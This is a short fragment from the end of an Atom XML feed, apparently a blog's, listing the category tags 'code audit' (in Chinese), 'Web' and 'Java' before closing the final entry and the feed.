    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
</feed>
